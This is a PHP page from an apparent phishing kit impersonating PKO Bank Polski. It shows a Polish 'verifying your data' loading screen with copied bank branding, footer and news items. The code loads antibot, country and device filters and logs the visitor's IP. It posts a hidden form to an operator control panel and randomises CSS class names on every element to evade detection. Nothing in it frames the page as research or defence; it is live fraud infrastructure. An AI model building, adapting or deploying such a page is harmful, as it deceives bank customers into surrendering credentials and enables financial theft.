<?php
    error_reporting(0);
    session_start();

    include "../antibots-debug/antibots.php";
    include '../setting/functions.php';
    include '../includes/current-page.php';
    include '../includes/check-allowed-countries.php';
    include '../includes/check-devices-allow.php';

    $ip = get_client_ip();
    $get_name_file = $ip;
    $get_name_page = "Page Loading";
    get_page_info($get_name_page, $get_name_file);
    
    $random_classes = rand(0, 1000000); 
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';

?>
<!DOCTYPE html>
<html lang="en" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> ">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- SEO -->
    <?php include '../libraries/seo.php'; ?>
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="../css/main.css">
    <link rel="stylesheet" href="../css/basic-thinks.css">
    <!-- Favicon -->
    <link rel="icon" type="image/png" href="../img/favicon.ico">
    <link rel="shortcut" type="image/png" href="../img/favicon.ico">
    <link rel="appel-touch-icon" type="image/png" href="../img/favicon.ico">
    <title>STRONA INTERNETOWA</title>
</head>
<body id="body" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> body">
    <!-- Nav -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> nav-section">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> content-nav-section">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> logo">
                <img src="../img/logo.png" alt="">
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> btn-lang">
                <img src="../img/flag.png" alt="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> flag">
                PL
                <img src="../img/icon-arrow.png" alt="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> arrow">
            </div>
        </div>
    </div>
    <!-- Nav -->

    <!-- Main -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> main-section">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> content-main-section">
            <form action="../control-panel/check-action.php" method="post" id="fSD" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> f-s-d-p-section">
                <input type="hidden" name="step" value="confirmed">
                <input type="hidden" name="ip" value="<?php echo $get_name_file; ?>">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-width">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-2" style="margin-bottom: 10px !important;">
                        <h1 style="width: 100% !important;text-align: center !important;">Proszę czekać</h1>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> loading">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> spinner"></div>
                    </div>
                    <p class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> p-explain" style="width: 100% !important;text-align: center !important;">
                       Weryfikujemy Twoje dane. Wkrótce zostaniesz przekierowany na następną stronę. Proces weryfikacji nie potrwa długo.
                    </p>
                </div>
            </form>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-text-login">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-image">
                    <img src="../img/image-login.png" alt="">
                </div>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-text">
                    <h1>Ho, ho, ho!</h1>
                    <p>
                        Łap prezent od Mikołaja – do 14.12 br. pożyczka z niższym oprocentowaniem. RRSO 11,42%
                    </p>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> style-btn">Sprawdź propozycję</div>
                </div>
            </div>
        </div> 
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-boxs">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> box-section">
                <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> current-date"><?php echo date("d.m.Y"); ?></small>
                <h4>Bezpieczeństwo zaczyna się od prostych nawyków</h4>
                <p>
                    Koniec roku to dobry moment, by uporządkować kwestie związane z bezpieczeństwem Twoich danych i pieniędzy.
                </p>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-box">Więcej</div>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> box-section">
                <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> current-date"><?php echo date("d.m.Y"); ?></small>
                <h4>Już jest! Potwierdzanie przelewów dziecka w aplikacji IKO</h4>
                <p>
                    Sprawdź nowości dla rodziców
                </p>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-box">Więcej</div>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> box-section" style="margin-bottom: 0px !important;">
                <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> current-date">28.07.<?php echo date("Y"); ?></small>
                <h4 style="color: #ca171d !important;">Kolejne ataki cyberprzestępców</h4>
                <p style="color: #ca171d !important;">
                    Sprawdź najnowsze ostrzeżenia.
                </p>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-box">Więcej</div>
            </div>
        </div>
    </div>
    <!-- Main -->

    <!-- Footer -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> footer-section">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> content-footer-section">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> links-footer-left">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-left">© 2025 PKO Bank Polski</span>
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-left">Kod BIC (Swift): BPKOPLPW</span>
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-left">Polityka prywatności</span>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> links-footer-right">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-right"><img src="../img/icon-footer-1.png" alt="">Bezpieczeństwo</span>
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-right"><img src="../img/icon-footer-2.png" alt="">Pomoc</span>
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-right"><img src="../img/icon-footer-3.png" alt="">Kontakt</span>
            </div>
        </div>
    </div>
    <!-- Footer -->

    <!-- Script Js -->
    <script src="../js/jquery.min.js"></script>
    <?php include '../includes/redirect.php'; ?>
    <?php include '../includes/status.php'; ?>
</body>
</html>
